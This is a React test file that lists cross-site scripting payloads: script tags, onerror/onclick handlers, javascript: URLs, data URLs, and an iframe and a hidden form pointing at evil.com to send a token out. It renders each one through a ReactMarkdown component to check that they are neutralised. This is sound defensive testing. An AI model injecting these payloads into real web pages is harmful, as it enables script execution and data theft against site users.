// Security test for ReactMarkdown XSS prevention
import React from 'react'
import ReactMarkdown from './ReactMarkdown'

/**
 * Test cases for XSS prevention in ReactMarkdown component
 * These malicious inputs should be safely rendered without executing scripts
 */
export const XSSTestCases = {
  // Script injection attempts
  scriptTag: '<script>alert("XSS Attack!")</script>',
  scriptWithAttributes: '<script src="evil.js" onload="alert(\'XSS\')"></script>',
  
  // Event handler injection
  imgWithOnerror: '<img src="fake.jpg" onerror="alert(\'XSS via img\')" />',
  linkWithOnclick: '<a href="#" onclick="alert(\'XSS via link\')">Click me</a>',
  divWithOnload: '<div onload="alert(\'XSS via div\')">Content</div>',
  
  // JavaScript protocol injection
  jsProtocolLink: '<a href="javascript:alert(\'XSS via href\')">Malicious Link</a>',
  jsProtocolImg: '<img src="javascript:alert(\'XSS via src\')" />',
  
  // Iframe and object injection
  maliciousIframe: '<iframe src="https://evil.com/steal-data"></iframe>',
  objectTag: '<object data="evil.swf" type="application/x-shockwave-flash"></object>',
  embedTag: '<embed src="evil.swf" type="application/x-shockwave-flash">',
  
  // Form injection
  hiddenForm: '<form action="https://evil.com" method="POST"><input type="hidden" name="token" value="stolen"><input type="submit" value="Submit"></form>',
  
  // Style injection
  styleWithExpression: '<div style="background-image: url(javascript:alert(\'XSS\'))">Content</div>',
  
  // Data URL injection
  dataUrlImg: '<img src="data:text/html,<script>alert(\'XSS\')</script>" />',
  
  // Mixed safe and malicious content
  mixedContent: `
# Safe Markdown Content

This is **bold** text and *italic* text.

Here's some \`inline code\`.

<script>alert('This should be blocked!')</script>

- Safe list item
- Another safe item

[Safe Link](https://example.com)

<a href="javascript:alert('XSS')">Malicious Link</a>

\`\`\`javascript
// This code block should be safe
console.log("Hello World");
\`\`\`

<img src="x" onerror="alert('XSS')" alt="This should be safe alt text" />
  `
}

// Test component to validate security
export function SecurityTestComponent() {
  return (
    <div className="space-y-6 p-6">
      <h2 className="text-2xl font-bold text-red-600">🔒 XSS Security Test</h2>
      <p className="text-sm text-gray-600">
        The following content contains malicious XSS attempts that should be safely rendered:
      </p>
      
      {Object.entries(XSSTestCases).map(([testName, content]) => (
        <div key={testName} className="border border-gray-300 p-4 rounded">
          <h3 className="font-semibold text-sm text-gray-800 mb-2">
            Test: {testName}
          </h3>
          <div className="bg-gray-50 p-2 rounded mb-2">
            <code className="text-xs">{content}</code>
          </div>
          <div className="border-t pt-2">
            <p className="text-xs text-gray-500 mb-1">Rendered (should be safe):</p>
            <ReactMarkdown>{content}</ReactMarkdown>
          </div>
        </div>
      ))}
    </div>
  )
}